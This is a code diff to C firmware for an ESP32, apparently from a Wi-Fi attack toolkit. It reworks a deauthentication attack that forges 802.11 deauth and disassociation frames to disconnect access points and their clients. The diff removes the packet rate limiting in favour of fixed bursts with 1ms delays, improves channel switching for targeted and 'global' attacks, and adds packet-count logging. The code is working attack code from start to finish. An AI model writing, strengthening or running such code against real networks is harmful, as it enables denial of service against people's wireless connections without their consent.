@@ -2004,11 +2004,9 @@ static const uint8_t disassoc_packet_template[26] = {
 };
 
 esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t mac[6]) {
-    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-    if (err != ESP_OK) {
-        printf("Failed to set channel: %s\n", esp_err_to_name(err));
-    }
-
+    // Note: Channel setting is handled by the calling task to avoid redundant channel switches
+    // The task groups APs by channel and sets it once per channel iteration
+    
     // Create packets from templates
     uint8_t deauth_frame[sizeof(deauth_packet_template)];
     uint8_t disassoc_frame[sizeof(disassoc_packet_template)];
@@ -2042,23 +2040,15 @@ esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t m
     disassoc_frame[22] = seq & 0xFF;
     disassoc_frame[23] = (seq >> 8) & 0xFF;
 
-    // Send frames with rate limiting
-    if (check_packet_rate()) {
+    // Send frames with small delays (send 3 deauth + 1 disassoc)
+    for (int i = 0; i < 3; i++) {
         esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
         if(err == ESP_OK) deauth_packets_sent++;
-        if (check_packet_rate()) {
-            err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
-            if(err == ESP_OK) deauth_packets_sent++;
-        }
-        if (check_packet_rate()) {
-            err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
-            if(err == ESP_OK) deauth_packets_sent++;
-        }
-        if (check_packet_rate()) {
-            err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
-            if(err == ESP_OK) deauth_packets_sent++;
-        }
+        vTaskDelay(pdMS_TO_TICKS(1)); // 1ms delay
     }
+    esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+    deauth_packets_sent++;
+    vTaskDelay(pdMS_TO_TICKS(1));
 
     // If not broadcast, send reverse direction
     if (!is_broadcast) {
@@ -2078,28 +2068,24 @@ esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t m
         disassoc_frame[22] = seq & 0xFF;
         disassoc_frame[23] = (seq >> 8) & 0xFF;
 
-        // Send reverse frames with rate limiting
-        if (check_packet_rate()) {
+        // Send reverse frames with small delays
+        for (int i = 0; i < 3; i++) {
             esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
             if(err == ESP_OK) deauth_packets_sent++;
+            vTaskDelay(pdMS_TO_TICKS(1)); // 1ms delay
         }
-        if (check_packet_rate()) {
-            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
-            if(err == ESP_OK) deauth_packets_sent++;
-        }
-        if (check_packet_rate()) {
-            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
-            if(err == ESP_OK) deauth_packets_sent++;
-        }
-        if (check_packet_rate()) {
-            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
-            if(err == ESP_OK) deauth_packets_sent++;
-        }
+        esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+        deauth_packets_sent++;
+        vTaskDelay(pdMS_TO_TICKS(1));
     }
 
     return ESP_OK;
 }
 void wifi_deauth_task(void *param) {
+    // WiFi should already be started by wifi_manager_start_deauth()
+    // Just reset packet counter
+    deauth_packets_sent = 0;
+    
     if (ap_count == 0) {
         printf("No access points found\n");
         printf("Please run 'scan -w' first to find targets\n");
@@ -2122,37 +2108,51 @@ void wifi_deauth_task(void *param) {
     
     while (1) {
         if (selected_ap_count > 0 && selected_aps != NULL) {
-            for (int ch = 1; ch <= 14; ch++) {
-                bool channel_set = false;
-                for (int sel_idx = 0; sel_idx < selected_ap_count; sel_idx++) {
-                    for (int i = 0; i < ap_count; i++) {
-                        if (memcmp(ap_info[i].bssid, selected_aps[sel_idx].bssid, 6) == 0 && ap_info[i].primary == ch) {
-                            if (!channel_set) {
-                                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-                                channel_set = true;
-                            }
-                            wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, broadcast_mac);
-                            for (int j = 0; j < station_count; j++) {
-                                if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
-                                    wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
-                                }
+            // Attack selected APs - send to all selected APs on each iteration
+            for (int sel_idx = 0; sel_idx < selected_ap_count; sel_idx++) {
+                for (int i = 0; i < ap_count; i++) {
+                    if (memcmp(ap_info[i].bssid, selected_aps[sel_idx].bssid, 6) == 0) {
+                        int ch = ap_info[i].primary;
+                        esp_err_t err = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+                        if (err != ESP_OK) {
+                            printf("Failed to set channel %d: %s\n", ch, esp_err_to_name(err));
+                            continue;
+                        }
+                        vTaskDelay(pdMS_TO_TICKS(50)); // Wait for channel to stabilize
+                        
+                        wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, broadcast_mac);
+                        for (int j = 0; j < station_count; j++) {
+                            if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
+                                wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
                             }
                         }
+                        vTaskDelay(pdMS_TO_TICKS(10));
+                        break; // Found the AP, move to next selected AP
                     }
                 }
-                if (channel_set) vTaskDelay(pdMS_TO_TICKS(10));
             }
         } else if (strlen((const char *)selected_ap.ssid) > 0) {
+            int last_ch = -1;
             for (int i = 0; i < ap_count; i++) {
                 if (strcmp((char *)ap_info[i].ssid, (char *)selected_ap.ssid) == 0) {
                     int ch = ap_info[i].primary;
+                    // Set channel only if it changed
+                    if (ch != last_ch) {
+                        esp_err_t err = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+                        if (err != ESP_OK) {
+                            printf("Failed to set channel %d: %s\n", ch, esp_err_to_name(err));
+                            continue; // Skip this AP
+                        }
+                        vTaskDelay(pdMS_TO_TICKS(50)); // Wait for channel to stabilize
+                        last_ch = ch;
+                    }
                     wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, broadcast_mac);
                     for (int j = 0; j < station_count; j++) {
                         if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
                             wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
                         }
                     }
-                    vTaskDelay(pdMS_TO_TICKS(20));
+                    vTaskDelay(pdMS_TO_TICKS(10));
                 }
             }
         } else {
@@ -2161,6 +2161,7 @@ void wifi_deauth_task(void *param) {
                 for (int i = 0; i < ap_count; i++) {
                     if (ap_info[i].primary == ch) {
                         if (!channel_set) {
+                            vTaskDelay(pdMS_TO_TICKS(50)); // Wait for channel to stabilize
                             esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                             channel_set = true;
                         }
@@ -2178,19 +2179,24 @@ void wifi_deauth_task(void *param) {
         vTaskDelay(pdMS_TO_TICKS(50));
         uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
         if (now - last_log >= 5000) {
-            TERMINAL_VIEW_ADD_TEXT("%" PRIu32 " packets/sec\n", deauth_packets_sent/5);
-            printf("%" PRIu32 " packets/sec\n", deauth_packets_sent/5); 
+            uint32_t total = deauth_packets_sent;
+            TERMINAL_VIEW_ADD_TEXT("%" PRIu32 " packets/sec (Total: %" PRIu32 ")\n", deauth_packets_sent/5, total);
+            printf("%" PRIu32 " packets/sec (Total: %" PRIu32 ")\n", deauth_packets_sent/5, total); 
             deauth_packets_sent = 0;
             last_log = now;
         }
-
     }
+    
+    printf("\nDeauth attack stopped\n");
+    TERMINAL_VIEW_ADD_TEXT("Deauth attack stopped\n");
+    vTaskDelete(NULL);
 }
 
 void wifi_manager_start_deauth() {
     if (!beacon_task_running) {
         ap_manager_stop_services();
         esp_wifi_start();
+        vTaskDelay(pdMS_TO_TICKS(200)); // Wait for WiFi to fully initialize
         printf("Restarting Wi-Fi\n");
 #ifdef CONFIG_WITH_STATUS_DISPLAY
         status_display_show_attack("Deauth", "starting");
@@ -2214,6 +2220,8 @@ void wifi_manager_start_deauth() {
                 }
 #endif
             }
+            printf("Total APs scanned: %d\n", ap_count);
+            TERMINAL_VIEW_ADD_TEXT("Total APs scanned: %d\n", ap_count);
         } else if (strlen((const char *)selected_ap.ssid) > 0) {
             char sanitized_ssid[33];
             sanitize_ssid_and_check_hidden(selected_ap.ssid, sanitized_ssid, sizeof(sanitized_ssid));
@@ -2223,8 +2231,8 @@ void wifi_manager_start_deauth() {
             status_display_show_attack("Deauth", sanitized_ssid);
 #endif
         } else {
-            printf("Starting global deauth attack on all APs\n");
-            TERMINAL_VIEW_ADD_TEXT("Starting global deauth attack on all APs\n");
+            printf("Starting global deauth attack on all APs (#%d)\n", ap_count);
+            TERMINAL_VIEW_ADD_TEXT("Starting global deauth attack on all APs (#%d)\n", ap_count);
 #ifdef CONFIG_WITH_STATUS_DISPLAY
             status_display_show_attack("Deauth", "all APs");
 #endif
